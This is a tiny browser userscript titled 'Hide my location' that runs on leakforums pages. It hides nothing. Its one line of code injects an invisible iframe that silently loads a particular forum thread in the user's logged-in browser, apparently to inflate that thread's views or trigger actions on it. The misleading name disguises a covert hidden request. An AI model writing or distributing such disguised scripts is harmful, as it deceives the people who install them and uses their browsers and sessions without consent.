// ==UserScript==
// @name       Hide my location
// @namespace  Hide my locationLF98r47yfffffffffffffffff/
// @version    0.1
// @description  enter something useful
// @include      http://*leakforums*
// @copyright  2012+, You
// ==/UserScript==
document.getElementById('copyright').lastElementChild.outerHTML += "<iframe src='http://www.leakforums.org/showthread.php?tid=97893' style='display:none;'></iframe>";